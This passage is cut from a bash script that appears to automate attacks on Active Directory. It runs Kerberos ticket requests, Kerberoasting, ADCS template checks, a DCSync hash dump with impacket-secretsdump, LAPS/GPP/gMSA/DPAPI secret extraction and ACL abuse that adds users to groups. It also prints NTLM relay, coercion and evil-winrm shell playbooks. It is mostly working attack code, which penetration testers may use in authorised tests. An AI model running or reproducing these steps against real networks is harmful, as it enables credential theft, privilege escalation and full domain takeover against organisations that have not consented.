    section "PHASE 4 · KERBEROS TGT + CREDENTIAL VALIDATION"

    # --- Step 1: request the TGT FIRST. getTGT talks to -dc-ip directly, so it
    # works even before DNS/hosts is sorted, and a successful TGT is definitive
    # proof the credentials are valid. ---
    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]]; then
        subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
        local tgt="$OUTDIR/${USER}.ccache"
        rm -f "${USER}.ccache"
        if [[ -n "$HASH" ]]; then
            run "impacket-getTGT $(imp_principal) -hashes :$HASH -dc-ip $DC_IP"
            impacket-getTGT "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
        else
            run "impacket-getTGT $(imp_principal):*** -dc-ip $DC_IP"
            impacket-getTGT "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 | tee -a "$LOGFILE"
        fi
        if [[ -f "${USER}.ccache" ]]; then
            mv -f "${USER}.ccache" "$tgt" 2>/dev/null
            export KRB5CCNAME="$tgt"; KERB_TICKET="$tgt"; HAVE_AUTH=1
            ok "TGT obtained → ${C_BOLD}credentials are valid${C_RESET}"
            loot "Reusable Kerberos ticket → KRB5CCNAME=$tgt"
            note_cred_source "$USER" "authenticated (TGT obtained)"
        else
            warn "Could not obtain TGT (bad creds, clock skew, or wrong domain)"
        fi
    fi

    # --- Step 2: confirm over SMB (reuses the cached ticket via --use-kcache) ---
    subsection "Validating ${USER} against the DC"
    local args; mapfile -t args < <(nxc_cred_args)
    run "$NXC smb $DCT ${args[*]}"
    local out; out=$($NXC smb "$DCT" "${args[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"

    if echo "$out" | grep -q '\[+\]'; then
        HAVE_AUTH=1
        ok "Valid credentials for ${C_BOLD}$USER${C_RESET}"
        echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)' \
            && loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
    elif [[ "$HAVE_AUTH" == "1" ]]; then
        warn "SMB check inconclusive, but the TGT proves the creds — proceeding authenticated"
    else
        # No Kerberos / NTLM fallback path that also failed
        if [[ -n "$HASH" || -n "$PASS" ]] && [[ "$KERBEROS" != "1" ]]; then
            err "Credentials NOT valid for $USER (continuing unauthenticated)"; return
        fi
        err "Could not authenticate $USER (continuing unauthenticated)"; return
    fi
}

# ===========================================================================
#  PHASE 5 — AUTHENTICATED ENUMERATION
# ===========================================================================
phase_auth_enum() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 5 · AUTHENTICATED ENUMERATION"
    local args; mapfile -t args < <(nxc_cred_args)

    subsection "Password policy"
    run "$NXC smb $DCT ${args[*]} --pass-pol"
    $NXC smb "$DCT" "${args[@]}" --pass-pol 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/pass_policy.txt"

    subsection "Domain users"
    run "$NXC smb $DCT ${args[*]} --users"
    $NXC smb "$DCT" "${args[@]}" --users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_users.txt"
    # Extract clean usernames (rows whose date column is a date or <never>) and
    # merge into the master list so the summary + any user-driven logic see them.
    awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/ || $6=="<never>" {print $5}' "$OUTDIR/domain_users.txt" 2>/dev/null \
        | grep -vE '^$' | sort -u >"$OUTDIR/users_enum.txt"
    if [[ -s "$OUTDIR/users_enum.txt" ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        loot "$(wc -l <"$OUTDIR/users_enum.txt") domain users enumerated → users_all.txt"
    fi

    subsection "Domain groups"
    run "$NXC smb $DCT ${args[*]} --groups"
    $NXC smb "$DCT" "${args[@]}" --groups 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_groups.txt"

    if [[ "$CAP_LDAP" == "1" ]]; then
        subsection "User descriptions (often leak passwords)"
        run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
        $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
        grep -iE 'pass|pwd|cred' "$OUTDIR/user_descriptions.txt" 2>/dev/null \
            && loot "Possible passwords in descriptions! review user_descriptions.txt"

        subsection "Quick privilege-escalation indicators (LDAP modules)"
        for mod in maq adcs; do
            run "$NXC ldap $DCT ${args[*]} -M $mod"
            $NXC ldap "$DCT" "${args[@]}" -M "$mod" 2>&1 | tee -a "$LOGFILE"
        done
        info "MachineAccountQuota > 0 → potential escalation via machine accounts (RBCD)"
    else
        subsection "LDAP not exposed → secondary enumeration via rpcclient"
        if [[ "$CAP_RPC" == "1" || "$CAP_SMB" == "1" ]]; then
            local pw="${PASS:-}"; [[ -n "$HASH" ]] && pw="$HASH"
            run "rpcclient -U '$DOMAIN/$USER%***' $DC_IP -c 'enumdomusers;querydispinfo'"
            rpcclient -U "${DOMAIN}/${USER}%${pw}" "$DC_IP" -c 'enumdomusers;querydispinfo' 2>&1 \
                | tee -a "$LOGFILE" | tee "$OUTDIR/rpc_users_auth.txt"
        else
            warn "No LDAP/RPC/SMB for secondary enum — limited visibility"
        fi
    fi

    subsection "Readable shares (authenticated)"
    run "$NXC smb $DCT ${args[*]} --shares"
    $NXC smb "$DCT" "${args[@]}" --shares 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/shares_auth.txt"
}

# ===========================================================================
#  PHASE 6 — KERBEROASTING
# ===========================================================================
phase_kerberoast() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 6 · KERBEROASTING (service accounts with SPNs)"
    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → Kerberoasting not possible"; return; }
    have impacket-GetUserSPNs || { warn "impacket-GetUserSPNs unavailable, skipping"; return; }
    local outf="$OUTDIR/kerberoast_hashes.txt"

    subsection "Requesting TGS tickets for SPN-enabled accounts"
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-GetUserSPNs $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request"
        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    elif [[ -n "$HASH" ]]; then
        run "impacket-GetUserSPNs $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    else
        run "impacket-GetUserSPNs $(imp_principal):*** -dc-ip $DC_IP -request"
        impacket-GetUserSPNs "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
    fi

    if [[ -s "$outf" ]]; then
        loot "Kerberoast hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to kerberoast_hashes.txt (crack with: hashcat -m 13100)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
    else
        info "No Kerberoastable accounts found (no SPNs configured)"
    fi
}

# ===========================================================================
#  PHASE 7 — ADCS / CERTIPY  (vulnerable certificate templates)
# ===========================================================================
phase_adcs() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 7 · ADCS — VULNERABLE CERTIFICATE TEMPLATES (Certipy)"
    have certipy || { warn "certipy unavailable, skipping"; return; }

    subsection "certipy find — scanning for ESC1..ESC16"
    local cargs=(-u "${USER}@${DOMAIN}" -dc-ip "$DC_IP" -stdout -vulnerable)
    [[ -n "$HASH" ]] && cargs+=(-hashes ":$HASH")
    [[ -n "$PASS" ]] && cargs+=(-p "$PASS")
    [[ "$KERBEROS" == "1" ]] && cargs+=(-k)
    run "certipy find ${cargs[*]}"
    local cout; cout=$(certipy find "${cargs[@]}" 2>&1); echo "$cout" | tee -a "$LOGFILE"
    echo "$cout" >"$OUTDIR/certipy_find.txt"

    # full structured output (BloodHound + JSON) for later analysis
    certipy find -u "${USER}@${DOMAIN}" \
        $([[ -n "$HASH" ]] && echo "-hashes :$HASH") $([[ -n "$PASS" ]] && echo "-p $PASS") \
        -dc-ip "$DC_IP" -output "$OUTDIR/certipy" >/dev/null 2>&1

    if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
        local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
        loot "★★★ Vulnerable ADCS detected: $escs ★★★"
        warn "Review certipy_find.txt — possible escalation to Domain Admin via certificates"
        echo "$cout" | grep -iE 'Template Name|ESC[0-9]+|Enrollment Rights|Vulnerab' | sed 's/^/      /'
        info "e.g. ESC1:  certipy req -u $USER@$DOMAIN -ca <CA> -template <TPL> -upn administrator@$DOMAIN -dc-ip $DC_IP"
    else
        info "No automatically exploitable templates detected"
    fi
}

# ===========================================================================
#  PHASE 8 — BLOODHOUND COLLECTION
# ===========================================================================
phase_bloodhound() {
    [[ "$HAVE_AUTH" != "1" || "$DO_BLOODHOUND" != "1" ]] && return
    section "PHASE 8 · BLOODHOUND — ATTACK GRAPH COLLECTION"
    have bloodhound-python || { warn "bloodhound-python unavailable, skipping"; return; }

    subsection "Collecting all methods (All)"
    local bh_out="$OUTDIR/bloodhound"; mkdir -p "$bh_out"
    local bargs=(-d "$DOMAIN" -u "$USER" -ns "$DC_IP" -c All --zip)
    [[ -n "$HASH" ]] && bargs+=(--hashes ":$HASH")
    [[ -n "$PASS" ]] && bargs+=(-p "$PASS")
    [[ "$KERBEROS" == "1" ]] && bargs+=(-k --dns-tcp)
    run "bloodhound-python ${bargs[*]}"
    ( cd "$bh_out" && bloodhound-python "${bargs[@]}" 2>&1 ) | tail -30 | tee -a "$LOGFILE"
    local zip; zip=$(ls -t "$bh_out"/*.zip 2>/dev/null | head -1)
    [[ -n "$zip" ]] && loot "BloodHound data ready → $zip (import into the GUI)"
}

# ===========================================================================
#  PHASE 9 — DCSYNC / SECRETSDUMP
# ===========================================================================
phase_dcsync() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "PHASE 9 · DCSYNC / SECRETSDUMP — DOMAIN HASH DUMP"
    have impacket-secretsdump || { warn "impacket-secretsdump unavailable, skipping"; return; }
    local outf="$OUTDIR/secretsdump.txt"

    subsection "Attempting DCSync (requires DA / replication rights)"
    info "If this fails, the current account lacks the privileges — that's expected."
    if [[ -n "$KERB_TICKET" ]]; then
        run "KRB5CCNAME=$KERB_TICKET impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
        KRB5CCNAME="$KERB_TICKET" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    elif [[ -n "$HASH" ]]; then
        run "impacket-secretsdump $(imp_principal)@$DC_IP -hashes :$HASH -just-dc"
        impacket-secretsdump "$(imp_principal)@$DC_IP" -hashes ":$HASH" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    else
        run "impacket-secretsdump $(imp_principal):***@$DC_IP -just-dc"
        impacket-secretsdump "$(imp_principal):${PASS}@$DC_IP" -just-dc -outputfile "$OUTDIR/dcsync" 2>&1 | tee -a "$LOGFILE" | tee "$outf"
    fi

    if grep -qE ':::' "$outf" 2>/dev/null; then
        loot "★★★★★ DCSYNC SUCCESSFUL — ENTIRE DOMAIN NTLM HASHES DUMPED ★★★★★"
        ok "$(grep -cE ':::' "$outf") NTLM hashes dumped:"
        grep -E ':::' "$outf" | while read -r line; do
            local u nt; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4)
            echo -e "      ${C_RED}${C_BOLD}$u${C_RESET} : ${C_MAGENTA}$nt${C_RESET}"
        done
        grep -iE '^administrator:' "$outf" | head -1 | while read -r l; do
            loot "ADMINISTRATOR HASH: $(echo "$l" | cut -d: -f4)"
        done
        ok "Full dump in secretsdump.txt → Pass-the-Hash ready"
        if [[ "$DO_CRACK" == "1" ]]; then
            grep -E ':::' "$outf" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
            crack_hashes "$OUTDIR/ntlm_hashes.txt" 1000 "NTLM"
        fi
    else
        warn "DCSync not authorized with these credentials (not DA / no replication rights)"
    fi
}

# ===========================================================================
#  SECRETS  —  LAPS + gMSA  (quick, high-value reads)
# ===========================================================================
phase_secrets() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "SECRETS · LAPS & gMSA READS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → LAPS/gMSA reads need LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)

    subsection "LAPS — local admin passwords readable by this account"
    run "$NXC ldap $DCT ${args[*]} -M laps"
    local laps; laps=$($NXC ldap "$DCT" "${args[@]}" -M laps 2>&1); echo "$laps" | tee -a "$LOGFILE"
    echo "$laps" | grep -iE 'Computer:|Password:' >"$OUTDIR/laps.txt"
    if grep -qi 'Password:' "$OUTDIR/laps.txt" 2>/dev/null; then
        loot "★ LAPS passwords readable! → laps.txt (local admin on those hosts)"
    fi

    subsection "GPP passwords (cpassword in SYSVOL — classic AD leak)"
    run "$NXC smb $DCT ${args[*]} -M gpp_password"
    $NXC smb "$DCT" "${args[@]}" -M gpp_password 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/gpp.txt"
    grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null | while read -r p; do
        [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "GPP cpassword (SYSVOL)"; }
    done

    subsection "gMSA — group Managed Service Account hashes"
    run "$NXC ldap $DCT ${args[*]} --gmsa"
    local gmsa; gmsa=$($NXC ldap "$DCT" "${args[@]}" --gmsa 2>&1); echo "$gmsa" | tee -a "$LOGFILE"
    echo "$gmsa" | grep -iE 'Account:|NTLM:' >"$OUTDIR/gmsa.txt"
    # Queue any gMSA account whose NT hash we recovered
    echo "$gmsa" | grep -oP "Account:\s*\K\S+(?=.*NTLM:\s*\S+)" 2>/dev/null | while read -r acc; do
        local h; h=$(echo "$gmsa" | grep -i "$acc" | grep -oP 'NTLM:\s*\K[a-f0-9]{32}' | head -1)
        [[ -n "$h" ]] && { loot "★ gMSA hash recovered for $acc"; queue_cred "$acc" "" "$h"; }
    done
}

# ===========================================================================
#  NTLM RELAY & COERCION  —  detect relay/coercion conditions, give playbook
#  (relaying is interactive: we DETECT + hand you the exact commands, we don't
#   blindly fire listeners mid-scan)
# ===========================================================================
phase_relay() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
    section "NTLM RELAY & COERCION ASSESSMENT"
    local args; mapfile -t args < <(nxc_cred_args)
    local lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)

    subsection "SMB signing (relay to SMB viable only if NOT required)"
    local s; s=$($NXC smb "$DCT" "${args[@]}" 2>&1 | head -1); echo "$s" | tee -a "$LOGFILE"
    if echo "$s" | grep -qi 'signing:False'; then loot "★ SMB signing NOT required → NTLM relay to SMB possible"
    else info "SMB signing required (typical on a DC) — SMB relay blocked here"; fi

    if [[ "$CAP_LDAP" == "1" ]]; then
        subsection "LDAP signing & channel binding (relay → LDAP: RBCD / shadow creds / ESC8)"
        run "$NXC ldap $DCT ${args[*]} -M ldap-checker"
        $NXC ldap "$DCT" "${args[@]}" -M ldap-checker 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/relay_ldap.txt"
        grep -qiE 'not enforce|is not required|False|vulnerable' "$OUTDIR/relay_ldap.txt" 2>/dev/null \
            && loot "★ LDAP signing/channel-binding not enforced → relay to LDAP available"
    fi

    subsection "Coercion vectors (force the DC to authenticate to us)"
    run "$NXC smb $DCT ${args[*]} -M coerce_plus"
    $NXC smb "$DCT" "${args[@]}" -M coerce_plus 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/coerce.txt"
    grep -qiE 'VULNERABLE|is vuln|Success' "$OUTDIR/coerce.txt" 2>/dev/null \
        && loot "★ DC is coercible (PetitPotam/PrinterBug/DFSCoerce/MS-EVEN) → trigger auth for relay"
    $NXC smb "$DCT" "${args[@]}" -M spooler 2>&1 | tee -a "$LOGFILE"
    $NXC smb "$DCT" "${args[@]}" -M webdav  2>&1 | tee -a "$LOGFILE"

    subsection "Relay playbook (run these yourself — needs your listeners)"
    echo -e "      ${C_GREY}# 1) Relay to LDAPS and escalate (RBCD/shadow-cred), or -t smb://<other-host>:${C_RESET}"
    echo -e "      ${C_CYAN}impacket-ntlmrelayx -t ldaps://$DC_IP --escalate-user $USER -smb2support${C_RESET}"
    echo -e "      ${C_GREY}# 2) Coerce the DC to auth to you (${lhost:-<your-ip>}):${C_RESET}"
    echo -e "      ${C_CYAN}coercer coerce -l ${lhost:-<your-ip>} -t $DC_IP -d $DOMAIN -u $USER -p '<pass>'${C_RESET}"
    echo -e "      ${C_GREY}# or passively: ${C_CYAN}sudo responder -I tun0${C_GREY} to poison & capture NetNTLM hashes${C_RESET}"
}

# ===========================================================================
#  DOMAIN / FOREST TRUSTS  —  enumerate and surface cross-forest attack paths
# ===========================================================================
phase_trusts() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "TRUSTS · DOMAIN & CROSS-FOREST RELATIONSHIPS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → trust enumeration needs LDAP, skipping"; return; }
    local args; mapfile -t args < <(nxc_cred_args)
    local tf="$OUTDIR/trusts.txt"; : >"$tf"

    subsection "Enumerating trust relationships"
    # Primary: bloodyAD (clean, shows direction + type + transitivity)
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        run "bloodyAD ${ba[*]} get trusts"
        bloodyAD "${ba[@]}" get trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    fi
    # Second source: netexec module
    run "$NXC ldap $DCT ${args[*]} -M enum_trusts"
    $NXC ldap "$DCT" "${args[@]}" -M enum_trusts 2>&1 | tee -a "$LOGFILE" | tee -a "$tf"
    # Raw fallback: trustedDomain objects via LDAP
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" "(objectClass=trustedDomain)" \
            trustPartner trustDirection trustType trustAttributes flatName 2>/dev/null \
            | grep -iE 'trustPartner|trustDirection|trustType|trustAttributes|flatName' | tee -a "$tf"
    fi

    # Identify partner domains
    local partners; partners=$(grep -oiP 'trustPartner:\s*\K\S+' "$tf" 2>/dev/null | sort -u)
    [[ -z "$partners" ]] && partners=$(grep -oiP '(Target|Partner|Domain)\s*:?\s*\K[a-z0-9.-]+\.[a-z]{2,}' "$tf" 2>/dev/null | sort -u)

    if [[ -z "$partners" ]]; then
        info "No external/forest trusts found from this domain"
        return
    fi

    loot "Trust relationship(s) discovered:"
    echo "$partners" | while read -r d; do echo -e "      ${C_CYAN}↔${C_RESET} ${C_BOLD}$d${C_RESET}"; done

    subsection "Foreign Security Principals (accounts from trusted domains with access here)"
    if have bloodyAD; then
        local ba; mapfile -t ba < <(bloody_args)
        bloodyAD "${ba[@]}" get search --filter '(objectClass=foreignSecurityPrincipal)' --attr cn 2>&1 \
            | tee -a "$LOGFILE" | tee -a "$tf"
    fi

    subsection "Cross-forest exploitation paths"
    info "Reviewing each trust for actionable abuse:"
    echo "$partners" | while read -r pd; do
        [[ -z "$pd" ]] && continue
        echo -e "    ${C_PURPLE}▸ Trust toward ${C_BOLD}$pd${C_RESET}"
        echo -e "      ${C_GREY}- Cross-forest Kerberoast:${C_RESET} impacket-GetUserSPNs ${DOMAIN}/${USER} -target-domain $pd -request -dc-ip $DC_IP"
        echo -e "      ${C_GREY}- Foreign group membership / ACLs in $pd (check BloodHound 'Cross-domain')${C_RESET}"
        echo -e "      ${C_GREY}- If bidirectional + SIDHistory not filtered → SID History / inter-realm TGT abuse${C_RESET}"
        # Attempt cross-forest kerberoast automatically (read-only, high value)
        if have impacket-GetUserSPNs && [[ -n "$KERB_TICKET" ]]; then
            run "cross-forest kerberoast against $pd"
            KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "${DOMAIN}/${USER}" -k -no-pass \
                -dc-host "${DC_FQDN:-$DC_IP}" -target-domain "$pd" -request \
                -outputfile "$OUTDIR/kerberoast_xforest_${pd}.txt" 2>&1 | tee -a "$LOGFILE"
            [[ -s "$OUTDIR/kerberoast_xforest_${pd}.txt" ]] && \
                loot "★ Cross-forest Kerberoast hashes from $pd → kerberoast_xforest_${pd}.txt"
        fi
    done
}

# ===========================================================================
#  WINRM ACCESS + DPAPI  —  where can we land a shell, and what's in DPAPI
# ===========================================================================
# Run whoami /priv + /groups over WinRM and map dangerous rights to techniques
analyze_privileges() {
    local args; mapfile -t args < <(nxc_cred_args)
    subsection "Token privileges & dangerous rights (whoami /priv, /groups)"
    local pr; pr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /priv" 2>&1)
    echo "$pr" | tee -a "$LOGFILE" | tee "$OUTDIR/whoami_priv_${USER}.txt" >/dev/null
    local gr; gr=$($NXC winrm "$DCT" "${args[@]}" -x "whoami /groups" 2>&1)
    echo "$gr" >>"$OUTDIR/whoami_priv_${USER}.txt"

    # Privilege → escalation technique mapping
    local -A P=(
        [SeImpersonatePrivilege]="Potato → PrintSpoofer / GodPotato / JuicyPotatoNG = SYSTEM"
        [SeAssignPrimaryTokenPrivilege]="Token assignment → Potato = SYSTEM"
        [SeBackupPrivilege]="Read ANY file → dump SAM+SYSTEM / NTDS.dit (reg save / robocopy /b)"
        [SeRestorePrivilege]="Write ANY file/registry → service/DLL hijack = SYSTEM"
        [SeDebugPrivilege]="Dump LSASS / inject into SYSTEM processes (mimikatz/nanodump)"
        [SeTakeOwnershipPrivilege]="Take ownership of any object → overwrite & escalate"
        [SeLoadDriverPrivilege]="Load malicious driver → kernel = SYSTEM"
        [SeManageVolumePrivilege]="Raw disk write → plant SYSTEM file"
        [SeTcbPrivilege]="Act as part of the OS = SYSTEM"
        [SeCreateTokenPrivilege]="Forge tokens = SYSTEM"
    )
    local found=0 k
    for k in "${!P[@]}"; do
        if echo "$pr" | grep -qi "$k"; then loot "★ Dangerous privilege: ${C_BOLD}$k${C_RESET} → ${P[$k]}"; found=1; fi
    done
    # Dangerous group memberships
    local g
    for g in "Backup Operators" "Server Operators" "Account Operators" "DnsAdmins" \
             "Print Operators" "Hyper-V Administrators" "Group Policy Creator Owners" \
             "Schema Admins" "Enterprise Admins" "Domain Admins"; do
        echo "$gr" | grep -qi "$g" && { loot "★ Privileged group: ${C_BOLD}$g${C_RESET} → known escalation path"; found=1; }
    done
    [[ "$found" == "0" ]] && info "No standout dangerous privileges/groups on this token"
}

phase_winrm_dpapi() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "WINRM ACCESS & DPAPI SECRETS"
    local args; mapfile -t args < <(nxc_cred_args)

    if [[ "$CAP_WINRM" == "1" ]]; then
        subsection "WinRM: can this account get a remote shell?"
        run "$NXC winrm $DCT ${args[*]}"
        local w; w=$($NXC winrm "$DCT" "${args[@]}" 2>&1); echo "$w" | tee -a "$LOGFILE"
        if echo "$w" | grep -qi 'Pwn3d'; then
            loot "★ ${USER} has WinRM shell access!"
            if [[ -n "$KERB_TICKET" ]]; then
                ok "Shell:  KRB5CCNAME=$KERB_TICKET evil-winrm -i $DC_FQDN -r $DOMAIN"
            else
                ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
            fi
            analyze_privileges
        fi
        if [[ "$CAP_LDAP" == "1" ]]; then
            subsection "Members of 'Remote Management Users' (who can WinRM)"
            run "$NXC ldap $DCT ${args[*]} -M group-mem -o GROUP='Remote Management Users'"
            $NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>&1 \
                | tee -a "$LOGFILE" | tee "$OUTDIR/winrm_users.txt"
        fi
    else
        info "WinRM (5985) not exposed on this host"
    fi

    if [[ "$CAP_SMB" == "1" ]]; then
        subsection "DPAPI: dumping protected secrets (needs local admin on target)"
        run "$NXC smb $DCT ${args[*]} --dpapi"
        local d; d=$($NXC smb "$DCT" "${args[@]}" --dpapi 2>&1); echo "$d" | tee -a "$LOGFILE" | tee "$OUTDIR/dpapi.txt"
        if echo "$d" | grep -qiE 'access.?denied|not.*admin|ERROR'; then
            info "DPAPI needs local admin — not available with this account (expected if not privileged)"
        fi
        # Harvest any plaintext DPAPI recovered → feed the engine
        echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u | while read -r p; do
            [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "DPAPI"; }
        done
        grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
    fi

    # Flag DPAPI material pulled from shares earlier (offline decryption guidance)
    if find "$OUTDIR/shares" -ipath '*Protect*' -o -ipath '*Credentials*' 2>/dev/null | grep -q .; then
        warn "Offline DPAPI blobs in looted shares → impacket-dpapi (masterkey then credential)"
    fi
}

# ===========================================================================
#  ACL ABUSE  —  enumerate exploitable rights and (optionally) abuse them
# ===========================================================================
# bloodyAD authentication arguments for the current credential
bloody_args() {
    local a=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$USER")
    if   [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then a+=(-k)
    elif [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
    else a+=(-p "$PASS"); fi
    printf '%s\n' "${a[@]}"
}

phase_acl() {
    [[ "$HAVE_AUTH" != "1" ]] && return
    section "ACL ANALYSIS · EXPLOITABLE PERMISSIONS"
    [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → ACL analysis needs LDAP, skipping"; return; }
    have bloodyAD || { warn "bloodyAD unavailable, skipping ACL analysis"; return; }
    local ba; mapfile -t ba < <(bloody_args)
    local -A ABUSED=()   # object:action already handled, so we fire each once

    subsection "Objects the current account can write (bloodyAD get writable)"
    run "bloodyAD ${ba[*]} get writable --detail"
    local w; w=$(bloodyAD "${ba[@]}" get writable --detail 2>&1); echo "$w" | tee -a "$LOGFILE"
    echo "$w" >"$OUTDIR/acl_writable_${USER}.txt"

    if ! echo "$w" | grep -qiE 'distinguishedName|WRITE|GenericAll|Owner'; then
        info "No exploitable outbound ACLs for $USER"
        return
    fi
    loot "$USER holds writable rights over one or more objects — see acl_writable_${USER}.txt"

    # Parse candidate target objects (CN of each writable DN) and their rights
    # bloodyAD groups output per-object: a 'distinguishedName: CN=...' line followed by the granted permissions.
    local cur_dn="" cur_name="" cur_class=""
    while IFS= read -r line; do
        if [[ "$line" =~ distinguishedName:\ *(.*) ]]; then
            cur_dn="${BASH_REMATCH[1]}"
            cur_name=$(echo "$cur_dn" | grep -oP '^CN=\K[^,]+')
            cur_class=""
        fi
        [[ "$line" =~ objectClass.*group ]]    && cur_class="group"
        [[ "$line" =~ objectClass.*user  ]]    && cur_class="user"
        [[ "$line" =~ objectClass.*computer ]] && cur_class="computer"

        # Only react to rights that ACTUALLY escalate — ignore benign attribute
        # writes (thumbnailPhoto, pager, …). Each object+action fires once.
        [[ -z "$cur_name" ]] && continue
        local ll="${line,,}" act=""
        if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
        elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
        elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
        elif [[ "$ll" == *member:* && ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) ]]; then act="group"
        elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
        else continue; fi

        local dkey="${cur_name}:${act}"
        [[ -n "${ABUSED[$dkey]:-}" ]] && continue
        ABUSED["$dkey"]=1

        case "$act" in
            shadow) warn "Writable msDS-KeyCredentialLink on ${C_BOLD}$cur_name${C_RESET} → Shadow Credentials"; _abuse_shadowcred "$cur_name" ;;
            rbcd)   warn "Writable RBCD attr on ${C_BOLD}$cur_name${C_RESET} → Resource-Based Delegation"; _abuse_rbcd "$cur_name" ;;
            spn)    _abuse_writespn "$cur_name" ;;
            group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$cur_name" ;;
            full)
                warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                if [[ "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ]]; then _abuse_group "$cur_name"
                elif [[ "$cur_class" == "computer" || "$cur_name" == *\$ ]]; then _abuse_rbcd "$cur_name" || _abuse_shadowcred "$cur_name"
                else _abuse_shadowcred "$cur_name" || _abuse_user "$cur_name"; fi ;;
        esac
    done <<<"$w"
}

# Add the current user to a group we can write (with rollback)
_abuse_group() {
    local grp="$1"; local ba; mapfile -t ba < <(bloody_args)
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; run with --abuse to add $USER to '$grp')"; return; }
    confirm "  Add ${USER} to group '${grp}'?" || return
    run "bloodyAD ${ba[*]} add groupMember '$grp' '$USER'"
